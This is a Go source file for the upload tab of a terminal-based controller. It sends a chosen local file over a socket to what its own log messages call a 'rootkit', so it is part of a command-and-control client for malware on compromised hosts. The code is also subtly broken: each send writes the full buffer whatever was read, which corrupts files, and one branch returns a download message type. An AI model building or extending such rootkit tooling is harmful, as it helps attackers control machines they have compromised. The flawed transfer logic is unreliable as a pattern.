package model

import (
	"bufio"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"

	"cli/server"

	"github.com/charmbracelet/bubbles/filepicker"
	tea "github.com/charmbracelet/bubbletea"
)

type UploadModel struct {
	srv       *server.Server
	locked    *bool
	isLoading *bool
	logs      *LogsModel
	isDoing   *bool

	height int
	picker *filepicker.Model
}

type (
	UploadStartCmd int
	UploadDoneCmd  int
)

func NewUploadModel(cfg TabCfg, p *filepicker.Model) *UploadModel {
	b := false
	m := UploadModel{
		srv:       cfg.srv,
		locked:    cfg.locked,
		isLoading: cfg.isLoading,
		isDoing:   &b,
		logs:      cfg.logs,
		picker:    p,
		height: *cfg.height,
	}

	m.picker.SetHeight(m.height)
	return &m
}

func (m UploadModel) Init() tea.Cmd {
	return nil
}

func (m UploadModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	var cmds []tea.Cmd

	var cmd tea.Cmd
	*m.picker, cmd = m.picker.Update(msg)
	cmds = append(cmds, cmd)
	if didSelect, path := m.picker.DidSelectFile(msg); didSelect {
		// Don't accept commands if an upload is already running:
		if *m.isLoading || *m.isDoing {
			m.logs.Append("upload: another operation is pending\n")
		} else {
			f, err := os.Open(path)
			if err != nil {
				m.logs.Append(fmt.Sprintf("upload: couldn't open file %s: %v\n", path, err))
			} else {
				p := filepath.Base(path)
				cmds = append(cmds, tea.Sequence(m.startUploadCmd(p), m.waitForUploadResultCmd(p, f)))
			}
		}
	}
	return m, tea.Batch(cmds...)
	// return m, cmd
}

func (m UploadModel) View() string {
	if m.srv.ConnState != server.Connected {
		return "Not connected.\n"
	}
	s := strings.Builder{}

	// s.WriteString("\n\n\t\t\tType the path of the file you want to upload\n\n\n")
	m.picker.SetHeight(m.height-4)
	s.WriteString(m.picker.View())

	return s.String()
}

func (m UploadModel) startUploadCmd(pth string) tea.Cmd {
	return func() tea.Msg {
		if *m.isLoading || m.srv.ConnState != server.Connected {
			m.logs.Append("upload: not connected\n")
			return nil
		}

		filename := fmt.Sprintf("%s_%s", pth, time.Now().Format("01-02-2006"))
		conn := *m.srv.Sock
		_, err := fmt.Fprintf(conn, "3 %s\n", filename)
		if err != nil {
			return ConnectionUpdateMsg(server.Disconnected)
		}

		*m.isLoading = true
		*m.isDoing = true
		return UploadStartCmd(1)
	}
}

func (m UploadModel) waitForUploadResultCmd(pth string, file *os.File) tea.Cmd {
	return func() tea.Msg {
		if !*m.isDoing {
			return nil
		}
		if file == nil {
			m.logs.Append("can't upload: file is nil!\n")
			*m.isLoading = false
			*m.isDoing = false
			return DownloadDoneCmd(0)
		}

		ch := m.srv.Channel
		timer := time.NewTimer(10 * time.Second)

		defer file.Close()
		shouldStartUpload := false

		select {
		case msg, ok := <-ch:
			if ok {
				switch msg {
				case "OK\n":
					m.logs.Append("upload started!\n")
					shouldStartUpload = true

				default:
					m.logs.Append(fmt.Sprintf("upload: unexpected response from rootkit: %s\n", msg))
				}
			} else {
				m.logs.Append(fmt.Sprintf("upload of file %s canceled\n", pth))
			}
		case <-timer.C:
			m.logs.Append(fmt.Sprintf("upload of file %s timed out\n", pth))
		}
		if shouldStartUpload {
			err := m.readAndSend(file)
			if err != nil {
				// readAndSend only bubbles network error up:
				return ConnectionUpdateMsg(server.Disconnected)
			}
			m.logs.Append("upload completed!\n")
		}
		*m.isLoading = false
		*m.isDoing = false
		return UploadDoneCmd(1)
	}
}

func (m UploadModel) readAndSend(file *os.File) error {
	conn := *m.srv.Sock
	rd := bufio.NewReader(file)
	buf := make([]byte, 1024)

	for {
		_, err := rd.Read(buf)
		if err != nil {
			// don't log EOF
			if err != io.EOF {
				m.logs.Append(fmt.Sprintf("upload: error reading: %s\n", err.Error()))
			}
			break
		}

		_, err = fmt.Fprint(conn, string(buf))
		if err != nil {
			m.logs.Append(fmt.Sprintf("uplaod: error sending file's content to rootkit: %s", err.Error()))
			return err
		}
	}

	_, err := fmt.Fprint(conn, "DONE\n")
	if err != nil {
		m.logs.Append(fmt.Sprintf("uplaod: error sending DONE status to rootkit: %s", err.Error()))
		return err
	}

	return nil
}
